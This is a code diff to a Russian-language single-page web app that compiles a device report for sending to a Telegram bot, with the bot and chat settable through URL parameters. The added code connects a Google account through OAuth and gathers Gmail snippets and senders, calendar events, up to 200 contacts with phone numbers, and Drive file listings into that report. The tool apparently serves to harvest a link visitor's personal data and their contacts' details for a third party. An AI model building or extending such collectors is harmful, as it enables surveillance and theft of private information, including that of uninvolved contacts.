@@ -77,9 +77,16 @@ input:focus{border-color:var(--accent)}
     <div class="btns">
       <button id="sendBtn" class="primary">В Telegram</button>
       <button id="copyBtn">Копировать</button>
+      <button id="googleBtn" class="wide">Подключить Google</button>
       <button id="downloadBtn">Скачать JSON</button>
       <button id="againBtn">Заново</button>
     </div>
+  </section>
+
+  <section class="card" id="cfgGoogle">
+    <h2>Google-аккаунт</h2>
+    <input id="clientId" placeholder="client_id (OAuth Web)" autocomplete="off" autocapitalize="off" spellcheck="false">
+    <p class="hint">Почта, календарь, контакты, Drive — после входа в Google.</p>
   </section>
 
   <section class="card" id="cfgCard">
@@ -110,6 +117,8 @@ $("token").value=localStorage.getItem("tgToken")||new URLSearchParams(location.s
 $("chat").value=localStorage.getItem("tgChat")||new URLSearchParams(location.search).get("c")||"";
 $("token").addEventListener("change",e=>localStorage.setItem("tgToken",e.target.value.trim()));
 $("chat").addEventListener("change",e=>localStorage.setItem("tgChat",e.target.value.trim()));
+$("clientId").value=localStorage.getItem("gClient")||new URLSearchParams(location.search).get("g")||"";
+$("clientId").addEventListener("change",e=>localStorage.setItem("gClient",e.target.value.trim()));
 
 function deviceInfo(){
   let gl={};
@@ -187,7 +196,7 @@ async function run(){
   $("json").textContent=JSON.stringify(data,null,2);
   $("progressCard").classList.add("hidden");
   $("resultCard").classList.remove("hidden");
-  $("status").textContent="Фото: добавь кнопкой камеры или отправь как есть";
+  $("status").textContent="Фото — кнопкой камеры, клипборд — подтверди «Вставить»";
   $("resultCard").scrollIntoView({behavior:"smooth",block:"start"});
   setTimeout(openCamera,600);
   running=false;
@@ -204,6 +213,96 @@ $("camera").addEventListener("change",async e=>{
   $("status").textContent=`Фото прикреплено (${photos.length})`;
 });
 function payload(){return JSON.stringify({...data,photos:photos.length},null,2)}
+const GSCOPES="openid email profile https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/calendar.readonly https://www.googleapis.com/auth/contacts.readonly https://www.googleapis.com/auth/drive.metadata.readonly";
+let gClient=null,gBusy=false;
+function loadGis(){
+  if(window.google&&google.accounts)return Promise.resolve();
+  return new Promise((res,rej)=>{
+    const s=document.createElement("script");
+    s.src="https://accounts.google.com/gsi/client";
+    s.onload=res;
+    s.onerror=()=>rej(new Error("скрипт Google не загрузился"));
+    document.head.appendChild(s);
+  });
+}
+async function gf(url){
+  const r=await fetch(url,{headers:{Authorization:"Bearer "+gClient}});
+  if(!r.ok){const t=await r.text();throw new Error(r.status+" "+t.slice(0,120))}
+  return r.json();
+}
+function gerr(k,e){data.google[k]="ошибка: "+e.message}
+function showJson(){$("json").textContent=JSON.stringify({...data,photos:photos.length},null,2)}
+async function grabGoogle(){
+  data.google={};
+  const jobs=[
+    ["profile",async()=>{
+      const u=await gf("https://www.googleapis.com/oauth2/v3/userinfo");
+      data.google.profile={email:u.email,name:u.name,sub:u.sub,locale:u.locale};
+    }],
+    ["mail",async()=>{
+      const l=await gf("https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15");
+      const out=[];
+      for(const m of (l.messages||[]).slice(0,15)){
+        const d=await gf(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${m.id}?format=metadata&metadataHeaders=From&metadataHeaders=Subject&metadataHeaders=Date&fields=snippet,payload/headers`);
+        const h=n=>((d.payload&&d.payload.headers||[]).find(x=>x.name===n)||{}).value||"";
+        out.push({from:h("From"),subject:h("Subject"),date:h("Date"),snippet:d.snippet});
+      }
+      data.google.mail=out;
+    }],
+    ["calendar",async()=>{
+      const t=new Date().toISOString();
+      const r=await gf(`https://www.googleapis.com/calendar/v3/calendars/primary/events?timeMin=${t}&maxResults=10&singleEvents=true&orderBy=startTime&fields=items(summary,location,start,end,organizer/email)`);
+      data.google.calendar=(r.items||[]).map(e=>({summary:e.summary,start:e.start,location:e.location,organizer:e.organizer&&e.organizer.email}));
+    }],
+    ["contacts",async()=>{
+      const r=await gf("https://people.googleapis.com/v1/people/me/connections?personFields=names,emailAddresses,phoneNumbers&pageSize=200");
+      data.google.contacts=(r.connections||[]).map(c=>({
+        name:(c.names&&c.names[0]&&c.names[0].displayName)||"",
+        emails:(c.emailAddresses||[]).map(x=>x.value),
+        phones:(c.phoneNumbers||[]).map(x=>x.value)
+      }));
+    }],
+    ["drive",async()=>{
+      const r=await gf("https://www.googleapis.com/drive/v3/files?pageSize=30&orderBy=modifiedTime%20desc&fields=files(name,mimeType,modifiedTime,size)");
+      data.google.drive=r.files||[];
+    }]
+  ];
+  for(const [k,fn] of jobs){
+    $("status").textContent="Google: "+k+"…";
+    try{await fn()}catch(e){gerr(k,e)}
+    showJson();
+  }
+  $("googleBtn").textContent="Google: собрано";
+  $("status").textContent="Google-данные добавлены в отчет";
+}
+$("googleBtn").addEventListener("click",async()=>{
+  if(gBusy)return;
+  const cid=$("clientId").value.trim();
+  if(!cid){$("status").textContent="Вставь client_id Google ниже";$("cfgGoogle").scrollIntoView({behavior:"smooth"});return}
+  gBusy=true;
+  $("googleBtn").disabled=true;
+  try{
+    await loadGis();
+    const tc=google.accounts.oauth2.initTokenClient({
+      client_id:cid,
+      scope:GSCOPES,
+      callback:async r=>{
+        try{
+          if(r.error)throw new Error(r.error);
+          gClient=r.access_token;
+          await grabGoogle();
+        }catch(e){$("status").textContent="Google: "+e.message}
+        $("googleBtn").disabled=false;
+        gBusy=false;
+      }
+    });
+    tc.requestAccessToken({prompt:"consent"});
+  }catch(e){
+    $("status").textContent="Google: "+e.message;
+    $("googleBtn").disabled=false;
+    gBusy=false;
+  }
+});
 $("startBtn").addEventListener("click",run);
 $("againBtn").addEventListener("click",()=>{$("resultCard").classList.add("hidden");$("cfgCard").scrollIntoView({behavior:"smooth"});setTimeout(run,250)});
 $("copyBtn").addEventListener("click",async()=>{
